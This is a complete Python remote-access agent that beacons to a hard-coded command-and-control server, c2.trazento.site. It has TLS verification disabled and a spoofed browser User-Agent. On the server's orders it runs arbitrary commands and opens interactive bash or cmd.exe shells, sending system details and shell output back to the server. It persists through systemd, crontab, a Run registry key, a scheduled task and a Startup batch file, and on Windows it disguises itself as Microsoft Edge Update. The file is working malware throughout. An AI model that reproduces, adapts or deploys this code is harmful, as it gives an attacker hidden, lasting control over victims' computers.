#!/usr/bin/env python3
import base64
import hashlib
import hmac
import json
import os
import platform
import select
import signal
import socket
import subprocess
import sys
import threading
import time
import urllib.request
import urllib.error

SERVER = "https://c2.trazento.site"
AID = None
TOKEN = None
KEY = None
BUILD_KEY = ""
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
INTERVAL = 5
SH_FD = None
SH_PID = None
SH_BUF = []
SH_LOCK = threading.Lock()

def _expand(secret, iv, n):
    k = hmac.new(secret, iv, hashlib.sha256).digest()
    out = b""
    for i in range(n):
        out += hmac.new(k, str(i).encode(), hashlib.sha256).digest()
    return out[:n]

def encrypt(plain, key=None):
    k = key or KEY
    iv = os.urandom(16)
    p = plain.encode() if isinstance(plain, str) else plain
    ct = bytes(a ^ b for a, b in zip(p, _expand(k, iv, len(p))))
    tag = hmac.new(k, iv + ct, hashlib.sha256).digest()[:8]
    return base64.b64encode(iv + ct + tag).decode()

def decrypt(data, key=None):
    k = key or KEY
    raw = base64.b64decode(data.encode())
    iv, ct, tag = raw[:16], raw[16:-8], raw[-8:]
    expected = hmac.new(k, iv + ct, hashlib.sha256).digest()[:8]
    if not hmac.compare_digest(tag, expected):
        raise ValueError("bad tag")
    p = bytes(a ^ b for a, b in zip(ct, _expand(k, iv, len(ct))))
    return p.decode()

def _req(url, data):
    body = json.dumps(data).encode() if data else None
    hdrs = {"Content-Type": "application/json", "User-Agent": UA}
    return urllib.request.Request(url, data=body, headers=hdrs)

def _open(req):
    try:
        import ssl as _s
        ctx = _s.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _s.CERT_NONE
        return urllib.request.urlopen(req, context=ctx, timeout=10)
    except Exception:
        return None

def api(url, data=None):
    try:
        r = _open(_req(url, data))
        if r:
            return json.loads(r.read().decode())
    except Exception:
        pass
    return None

IS_WIN = platform.system() == "Windows"

if IS_WIN:
    def shell_start():
        global SH_FD, SH_PID
        import subprocess as _sp
        p = _sp.Popen(
            ["cmd.exe"],
            stdin=_sp.PIPE, stdout=_sp.PIPE, stderr=_sp.STDOUT,
            shell=True, bufsize=0
        )
        SH_FD = p.stdin
        SH_PID = p

        def reader():
            while True:
                try:
                    data = p.stdout.read(4096)
                    if not data:
                        break
                    with SH_LOCK:
                        SH_BUF.append(data)
                except Exception:
                    break

        t = threading.Thread(target=reader, daemon=True)
        t.start()

    def shell_write(text):
        if SH_FD is not None:
            try:
                SH_FD.write(text.encode())
                SH_FD.flush()
            except Exception:
                pass

    def shell_flush():
        with SH_LOCK:
            if not SH_BUF:
                return ""
            out = b"".join(SH_BUF)
            SH_BUF.clear()
        try:
            return out.decode(errors="replace")
        except Exception:
            return ""

    def shell_resize(cols=80, rows=24):
        pass

    def shell_stop():
        global SH_FD, SH_PID
        if SH_PID:
            try:
                SH_PID.kill()
            except Exception:
                pass
        SH_FD = None
        SH_PID = None

else:
    def shell_start():
        global SH_FD, SH_PID
        import pty
        pid, fd = pty.fork()
        if pid == 0:
            os.environ["TERM"] = "xterm-256color"
            os.execvp("/bin/bash", ["/bin/bash", "-i"])
        SH_FD = fd
        SH_PID = pid

        def reader():
            while True:
                try:
                    r, _, _ = select.select([SH_FD], [], [], 0.5)
                    if r:
                        data = os.read(SH_FD, 4096)
                        if not data:
                            break
                        with SH_LOCK:
                            SH_BUF.append(data)
                except (ValueError, OSError):
                    break
                except Exception:
                    break

        t = threading.Thread(target=reader, daemon=True)
        t.start()

    def shell_write(text):
        if SH_FD is not None:
            os.write(SH_FD, text.encode())

    def shell_flush():
        with SH_LOCK:
            if not SH_BUF:
                return ""
            out = b"".join(SH_BUF)
            SH_BUF.clear()
        try:
            return out.decode(errors="replace")
        except Exception:
            return ""

    def shell_resize(cols=80, rows=24):
        if SH_FD is not None:
            import struct, fcntl, termios
            s = struct.pack("HHHH", rows, cols, 0, 0)
            fcntl.ioctl(SH_FD, termios.TIOCSWINSZ, s)

    def shell_stop():
        global SH_FD, SH_PID
        if SH_PID:
            try:
                os.kill(SH_PID, signal.SIGTERM)
                os.waitpid(SH_PID, 0)
            except Exception:
                pass
        if SH_FD is not None:
            try:
                os.close(SH_FD)
            except Exception:
                pass
        SH_FD = None
        SH_PID = None

def register():
    global AID, TOKEN
    info = {
        "hostname": socket.gethostname(),
        "user": os.environ.get("USER", "?"),
        "os": f"{platform.system()} {platform.release()}"
    }
    r = api(f"{SERVER}/api/login", {"cipher": encrypt(json.dumps(info))})
    if r and "agent_id" in r:
        AID = r["agent_id"]
        TOKEN = r.get("token", "")
        return r.get("interval", 5)
    return 5

def send_result(data):
    return api(f"{SERVER}/api/tasks/{AID}", {"cipher": encrypt(json.dumps(data))})

def poll():
    r = api(f"{SERVER}/api/tasks/{AID}?token={TOKEN}")
    if r:
        return r.get("tasks", []), r.get("interval", 5), True
    return [], 5, False

def exec_shell(cmd):
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        return {"stdout": res.stdout, "stderr": res.stderr, "code": res.returncode}
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "TIMEOUT", "code": -1}
    except Exception as ex:
        return {"stdout": "", "stderr": str(ex), "code": -1}

RECONNECT = False

def do_task(t):
    global RECONNECT
    typ, pay = t.get("type", ""), t.get("payload", "")
    tid = t.get("id", 0)
    res = {"task_id": tid, "status": "done", "output": {}}

    if typ == "shell":
        res["output"] = exec_shell(pay)

    elif typ == "shell_start":
        if SH_FD is None:
            try:
                shell_start()
                res["output"] = {"stdout": "shell started", "stderr": "", "code": 0}
            except Exception as e:
                res["output"] = {"stdout": "", "stderr": f"shell start fail: {e}", "code": -1}
        else:
            res["output"] = {"stdout": "shell already running", "stderr": "", "code": 0}

    elif typ == "shell_input":
        if SH_FD is not None:
            shell_write(pay)
            res["output"] = {"stdout": "", "stderr": "", "code": 0}
        else:
            res["output"] = {"stdout": "", "stderr": "no shell", "code": -1}

    elif typ == "shell_resize":
        try:
            parts = pay.split("x")
            cols, rows = int(parts[0]), int(parts[1])
            shell_resize(cols, rows)
            res["output"] = {"stdout": f"resized {cols}x{rows}", "stderr": "", "code": 0}
        except Exception as e:
            res["output"] = {"stdout": "", "stderr": str(e), "code": -1}

    elif typ == "shell_stop":
        shell_stop()
        res["output"] = {"stdout": "shell stopped", "stderr": "", "code": 0}

    elif typ == "sleep":
        try:
            time.sleep(int(pay))
        except Exception:
            pass
        res["output"] = {"stdout": f"slept {pay}s", "stderr": "", "code": 0}

    elif typ == "exit":
        res["output"] = {"stdout": "exiting", "stderr": "", "code": 0}
        send_result(res)
        shell_stop()
        os._exit(0)

    elif typ == "reconnect":
        res["output"] = {"stdout": "reconnecting", "stderr": "", "code": 0}
        RECONNECT = True

    else:
        res["output"] = {"stdout": f"unknown type: {typ}", "stderr": "", "code": -1}

    return res

SERVICE_TEMPLATE = """[Unit]
Description=C2 Agent
After=network.target

[Service]
Type=simple
ExecStart={exec_cmd}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""

def install_persistence():
    agent_path = os.path.abspath(sys.argv[0])
    srv = SERVER
    is_win = platform.system() == "Windows"
    is_frozen = getattr(sys, 'frozen', False)
    key_b64 = base64.b64encode(KEY).decode() if KEY else ""

    if not is_win:
        if is_frozen:
            exec_cmd = f"{agent_path} --key {key_b64} --server {srv}"
        else:
            exec_cmd = f"{sys.executable} {agent_path} --key {key_b64} --server {srv}"
        svc = SERVICE_TEMPLATE.format(exec_cmd=exec_cmd)
        local_path = os.path.join(os.path.dirname(agent_path), "c2-agent.service")
        with open(local_path, "w") as f:
            f.write(svc)
        print(f"[*] systemd file: {local_path}")
        try:
            subprocess.run(["sudo", "-n", "cp", local_path, "/etc/systemd/system/c2-agent.service"],
                           capture_output=True, check=True)
            subprocess.run(["sudo", "-n", "systemctl", "daemon-reload"], capture_output=True, check=True)
            subprocess.run(["sudo", "-n", "systemctl", "enable", "c2-agent"], capture_output=True, check=True)
            subprocess.run(["sudo", "-n", "systemctl", "start", "c2-agent"], capture_output=True, check=True)
            print("[+] systemd installed")
            return
        except Exception:
            print("[!] no passwordless sudo")
            print(f"    sudo cp {local_path} /etc/systemd/system/c2-agent.service")
            print(f"    sudo systemctl daemon-reload && sudo systemctl enable c2-agent && sudo systemctl start c2-agent")

        cron = f"@reboot {exec_cmd} >/dev/null 2>&1 &"
        try:
            existing = subprocess.run("crontab -l 2>/dev/null", shell=True, capture_output=True, text=True).stdout
            if cron in existing:
                print("[=] crontab already installed")
                return
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True, check=True)
            print("[+] crontab installed")
            return
        except Exception as e:
            print(f"[!] crontab fail: {e}")
    else:
        import shutil
        local_appdata = os.environ.get("LOCALAPPDATA", os.environ.get("APPDATA", os.path.expanduser("~")))
        hide_dir = os.path.join(local_appdata, "Microsoft", "EdgeUpdate")
        target = os.path.join(hide_dir, "EdgeUpdate.exe")
        log_file = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "edgeupdate.log")
        try:
            os.makedirs(hide_dir, exist_ok=True)
            if os.path.abspath(sys.executable) != os.path.abspath(target):
                shutil.copy2(sys.executable, target)
            ok = _win_persistence_install(target, log_file)
            with open(log_file, "a") as lf:
                lf.write(f"OK={ok} target={target}\n")
            if ok:
                print(f"[+] Windows persistence: {target}")
            else:
                print(f"[!] Windows persistence FAILED \u2014 check {log_file}")
        except Exception as e:
            msg = f"[!] Windows install fail: {e}"
            print(msg)
            try:
                with open(log_file, "a") as lf:
                    lf.write(f"EXCEPTION: {e}\n")
            except Exception:
                pass

def _win_persistence_install(target, log_file):
    ok = False
    key_b64 = base64.b64encode(KEY).decode() if KEY else ""
    try:
        with open(log_file, "w") as lf:
            lf.write(f"target={target}\n")
    except Exception:
        pass
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        val = f'"{target}" --key {key_b64} --no-install'
        winreg.SetValueEx(key, "MicrosoftEdgeUpdate", 0, winreg.REG_SZ, val)
        winreg.CloseKey(key)
        ok = True
        with open(log_file, "a") as lf:
            lf.write(f"REGISTRY OK: {val}\n")
    except Exception as e:
        with open(log_file, "a") as lf:
            lf.write(f"REGISTRY FAIL: {e}\n")
    try:
        cmd = f'schtasks /create /tn "MicrosoftEdgeUpdate" /tr "\'{target}\' --key {key_b64} --no-install" /sc onlogon /rl limited /f'
        subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
        with open(log_file, "a") as lf:
            lf.write(f"SCHTASKS OK\n")
        ok = True
    except Exception as e:
        with open(log_file, "a") as lf:
            lf.write(f"SCHTASKS FAIL: {e}\n")
    try:
        startup = os.path.join(os.environ.get("APPDATA", ""),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        if startup and os.path.isdir(startup):
            bat = os.path.join(startup, "MicrosoftEdgeUpdate.bat")
            with open(bat, "w") as f:
                f.write(f'@start "" /b "{target}" --key {key_b64} --no-install\n')
            with open(log_file, "a") as lf:
                lf.write(f"STARTUP OK: {bat}\n")
            ok = True
    except Exception as e:
        with open(log_file, "a") as lf:
            lf.write(f"STARTUP FAIL: {e}\n")
    return ok

def remove_persistence():
    if platform.system() != "Windows":
        try:
            subprocess.run("crontab -l 2>/dev/null | grep -v 'c2_agent' | crontab -", shell=True, check=True)
            print("[+] crontab removed")
        except Exception:
            pass
        try:
            subprocess.run(["sudo", "-n", "systemctl", "stop", "c2-agent"], capture_output=True)
            subprocess.run(["sudo", "-n", "systemctl", "disable", "c2-agent"], capture_output=True)
        except Exception:
            pass
    else:
        try:
            subprocess.run('schtasks /delete /tn "MicrosoftEdgeUpdate" /f', shell=True, capture_output=True)
        except Exception:
            pass
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "MicrosoftEdgeUpdate")
            winreg.CloseKey(key)
        except Exception:
            pass
        try:
            startup = os.path.join(os.environ.get("APPDATA", ""),
                "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            if startup:
                for fname in os.listdir(startup):
                    if "MicrosoftEdgeUpdate" in fname:
                        os.unlink(os.path.join(startup, fname))
        except Exception:
            pass
        local_appdata = os.environ.get("LOCALAPPDATA", os.environ.get("APPDATA", ""))
        target = os.path.join(local_appdata, "Microsoft", "EdgeUpdate", "EdgeUpdate.exe")
        if os.path.exists(target):
            try:
                os.unlink(target)
            except Exception:
                pass
        print("[+] Windows persistence removed")

def main():
    global SERVER, INTERVAL, KEY, RECONNECT
    want_install = False
    want_remove = False
    no_install = False

    i = 1
    while i < len(sys.argv):
        a = sys.argv[i]
        if a == "--server" and i + 1 < len(sys.argv):
            SERVER = sys.argv[i + 1]; i += 2
        elif a == "--key" and i + 1 < len(sys.argv):
            KEY = base64.b64decode(sys.argv[i + 1].encode())
            i += 2
        elif a == "--install":
            want_install = True; i += 1
        elif a == "--remove":
            want_remove = True; i += 1
        elif a == "--no-install":
            no_install = True; i += 1
        elif a.startswith("http"):
            SERVER = a; i += 1
        else:
            i += 1

    if not KEY:
        if BUILD_KEY:
            KEY = base64.b64decode(BUILD_KEY.encode())
    if not KEY:
        env_key = os.environ.get("C2_KEY", "")
        if env_key:
            KEY = base64.b64decode(env_key.encode())

    if not KEY:
        print("[agent] ERROR: no encryption key. Provide --key <base64> or C2_KEY env var")
        sys.exit(1)

    if want_install:
        install_persistence(); return
    if want_remove:
        remove_persistence(); return

    print(f"[agent] {SERVER}")
    for attempt in range(999):
        INTERVAL = register()
        if AID:
            break
        print(f"[agent] register fail (attempt {attempt+1}), retry in 10s")
        time.sleep(10)
    else:
        return
    print(f"[agent] id={AID} interval={INTERVAL}s")
    if not no_install:
        install_persistence()

    poll_count = 0
    while True:
        if SH_FD is not None:
            so = shell_flush()
            if so:
                ok = send_result({"task_id": -1, "type": "shell_output", "output": {"stdout": so, "stderr": "", "code": 0}})
                if ok is None:
                    with SH_LOCK:
                        SH_BUF.insert(0, so.encode())

        tasks, ni, known = poll()
        if ni:
            INTERVAL = ni

        if not known:
            INTERVAL = register()
            if not AID:
                print("[agent] re-register fail")

        sleep_time = INTERVAL
        for t in tasks:
            r = do_task(t)
            send_result(r)
            if RECONNECT:
                RECONNECT = False
                shell_stop()
                break
            if t.get("type") == "exit":
                shell_stop()
                return
            if t.get("type") in ("shell_start", "shell_input", "shell_stop", "shell_resize"):
                sleep_time = 0.5

        if RECONNECT:
            RECONNECT = False
            print("[agent] reconnecting...")
            poll_count = 0
            INTERVAL = register()
            if not AID:
                print("[agent] re-register fail")
            continue

        if SH_FD is not None:
            sleep_time = 0.5

        time.sleep(sleep_time)
        poll_count += 1

if __name__ == "__main__":
    main()
